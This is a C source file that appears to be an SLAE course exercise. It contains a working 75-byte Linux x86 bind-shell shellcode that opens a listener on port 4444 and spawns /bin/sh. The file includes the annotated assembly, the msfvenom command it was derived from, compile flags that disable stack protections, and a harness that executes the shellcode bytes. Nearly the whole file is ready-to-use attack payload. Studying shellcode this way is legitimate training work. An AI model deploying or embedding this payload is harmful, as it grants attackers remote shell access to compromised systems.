/*

Architecture	: x86
OS		: Linux
Author		: wetw0rk
ID		: SLAE-958
Shellcode Size	: 75 bytes
Bind Port	: 4444
Description	: A linux/x86 bind shell via /bin/sh. Created by analysing msfvenom;
		  original payload was 78 bytes and contained 1 NULL. My shellcode
		  is 75 and contains 0 NULLS ;).

Original Metasploit Shellcode:
	sudo msfvenom -p linux/x86/shell_bind_tcp -b "\x00" -f c --smallest -i 0

Test using:
	gcc -fno-stack-protector -z execstack tshell.c

SECTION .text

global _start

_start:
        ; int socketcall(int call, unsigned long *args) remember to place backwards!
        push 102                ; syscall for socketcall() 102
        pop eax                 ; POP 102 into EAX
        cdq                     ; EDX = 0 (saves space)
        push ebx                ; PUSH EBX(0) onto stack (IPPROTO_IP = 0)
        inc ebx                 ; INC-rement EBX by 1
        push ebx                ; PUSH EBX(1) onto stack (SOCK_STREAM = 1)
        push 2                  ; PUSH 2 onto stack (AF_INET = 2)
        mov ecx,esp             ; top of stack contains our arguments save address in ECX
        int 80h                 ; call that kernel!!

        ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
        pop ebx                 ; POP stack(2 = SYS_BIND = bind()) into EBX
        pop esi                 ; POP stack(1) into ESI we dont need it
        push edx                ; PUSH EDX(0) onto the stack (INADDR_ANY = 0)
        push word 0x5c11        ; PUSH 0x5c11 onto the stack (PORT:4444)
        push edx                ; PUSH 00 onto the stack
        push byte 0x02          ; PUSH 02 onto the stack (AF_INET = 2)
        push 16                 ; PUSH 16 onto the stack (ADDRLEN = 16)
        push ecx                ; PUSH ECX(struct pointer) onto the stack
        push eax                ; PUSH EAX(socket file descriptor) onto stack
        mov ecx,esp             ; top of stack contains our argument array save it in ECX
        mov al,102              ; syscall for socketcall() 102
        int 80h                 ; call that kernel!!

        ; int listen(int sockfd, int backlog)
        mov [ecx+4],eax         ; zero out [ECX+4]
        mov bl,4                ; MOV (4 = SYS_LISTEN = listen()) into BL
        mov al,102              ; make syscall for socketcall()
        int 80h                 ; call the kernel!!

        ; accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
        inc ebx                 ; EBX(5) = SYS_ACCEPT = accept()
        mov al,102              ; make syscall for socketcall()
        int 80h                 ; call the kernel!!

        xchg eax,ebx            ; Put socket descriptor in EBX and 0x5 in EAX
        pop ecx                 ; POP 3 into ECX for counter

loop:
        ; int dup2(int oldfd, int newfd)
        mov al,63               ; syscall for dup2()
        int 80h                 ; call the kernel!!
        dec ecx                 ; count down to zero
        jns loop                ; If SF not set, ECX not negative so continue looping

done:
        ; int execve(const char *filename, char *const argv[], char *const envp[])
        push dword 0x68732f2f   ; PUSH hs// onto stack
        push dword 0x6e69622f   ; PUSH nib/ onto stack
        mov ebx,esp             ; put the address of "/bin//sh" into EBX via ESP
        push eax                ; PUSH nulls for string termination
        mov ecx,esp             ; store argv array into ECX via the stack or ESP
        mov al,11               ; make execve() syscall or 11
        int 80h                 ; call then kernel!!

*/

#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\x6a\x66\x58\x99\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5e\x52"
"\x66\x68\x11\x5c\x52\x6a\x02\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd"
"\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93"
"\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x2f\x2f\x73\x68\x68\x2f\x62"
"\x69\x6e\x89\xe3\x50\x89\xe1\xb0\x0b\xcd\x80";

int main()
{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}